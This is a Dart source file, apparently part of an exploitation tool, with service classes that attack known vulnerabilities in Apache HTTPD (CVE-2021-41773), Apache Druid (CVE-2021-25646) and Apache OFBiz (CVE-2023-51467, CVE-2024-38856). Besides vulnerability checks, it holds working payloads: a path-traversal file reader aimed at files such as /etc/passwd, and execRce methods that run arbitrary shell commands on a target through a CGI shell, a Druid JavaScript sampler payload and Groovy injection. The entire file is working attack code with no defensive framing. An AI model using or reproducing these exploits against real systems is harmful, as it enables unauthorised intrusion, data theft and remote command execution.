import 'dart:convert';

import 'package:http/http.dart' as http;

import 'exp_result.dart';

class ApacheHttpdExpService {
  final String baseUrl;
  final Duration timeout;

  ApacheHttpdExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base/icons/.%2e/%2e%2e/%2e%2e/etc/passwd';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('root:') ||
          res.body.contains('/bin/sh') ||
          res.body.contains('/bin/bash')) {
        return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-41773', '');
  }

  Future<String?> readFile(String filePath) async {
    try {
      final url =
          '$_base/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e${filePath.startsWith('/') ? filePath : '/$filePath'}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url = '$_base/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh';
      final res = await http
          .post(
            Uri.parse(url),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'echo;$cmd',
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class DruidExpService {
  final String baseUrl;
  final Duration timeout;

  DruidExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _buildPayload(String cmd) => jsonEncode({
        'type': 'index',
        'spec': {
          'type': 'index',
          'ioConfig': {
            'type': 'index',
            'inputSource': {'type': 'inline', 'data': '{"t":"1"}'},
            'inputFormat': {
              'type': 'javascript',
              'function':
                  'function(str){var a=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["sh","-c","$cmd"]).getInputStream());var b="";while(a.hasNextLine())b+=a.nextLine();return[b];}',
              'enabled': true,
            },
          },
          'dataSchema': {
            'dataSource': 'test',
            'timestampSpec': {
              'column': '!!!__time',
              'missingValue': '2010-01-01T00:00:00Z',
            },
            'dimensionsSpec': {},
          },
        },
        'samplerConfig': {'numRows': 10},
      });

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/druid/indexer/v1/sampler'),
            headers: {'Content-Type': 'application/json'},
            body: _buildPayload('id'),
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final data = decoded['data']?.toString() ?? '';
        if (data.isNotEmpty) {
          return ExpResult(
            true,
            'CVE-2021-25646',
            'Druid JavaScript 引擎可执行命令，输出:\n$data',
          );
        }
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-25646', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/druid/indexer/v1/sampler'),
            headers: {'Content-Type': 'application/json'},
            body: _buildPayload(cmd),
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body);
        final rows = decoded['data'] as List?;
        if (rows != null && rows.isNotEmpty) {
          final event = rows.first['event'] as Map?;
          return event?.values.first?.toString() ?? res.body;
        }
        return res.body;
      }
    } catch (_) {}
    return null;
  }
}

class OFBizExpService {
  final String baseUrl;
  final Duration timeout;

  OFBizExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> checkCve202351467() async {
    try {
      final res = await http
          .post(
            Uri.parse(
              '$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: "groovyProgram=throw+new+Exception('OFBiz_54289'.class.name);",
          )
          .timeout(timeout);
      if (res.body.contains('java.lang.String') ||
          res.body.contains('OFBiz_54289') ||
          res.statusCode == 200) {
        return ExpResult(
          true,
          'CVE-2023-51467',
          'OFBiz Groovy 代码注入端点无需认证，状态 ${res.statusCode}',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2023-51467', '');
  }

  Future<ExpResult> checkCve202438856() async {
    try {
      const body =
          '------WebKitFormBoundaryMAtrix911\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception("OFBiz_CVE_2024".class.nam\u0065);\r\n------WebKitFormBoundaryMAtrix911--';
      final res = await http
          .post(
            Uri.parse('$_base/webtools/control/main/ProgramExport'),
            headers: {
              'Content-Type':
                  'multipart/form-data; boundary=----WebKitFormBoundaryMAtrix911',
            },
            body: body,
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.body.contains('java.lang')) {
        return ExpResult(
          true,
          'CVE-2024-38856',
          'OFBiz Groovy Unicode 绕过端点响应，状态 ${res.statusCode}',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2024-38856', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final groovy = Uri.encodeComponent(
        'throw new Exception(["bash","-c","$cmd"].execute().text);',
      );
      final res = await http
          .post(
            Uri.parse(
              '$_base/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'groovyProgram=$groovy',
          )
          .timeout(timeout);
      final match = RegExp(
        r'Exception[^:]*:\s*([^\n<]+)',
        caseSensitive: false,
      ).firstMatch(res.body);
      return match?.group(1)?.trim() ?? (res.body.isNotEmpty ? res.body : null);
    } catch (_) {
      return null;
    }
  }
}
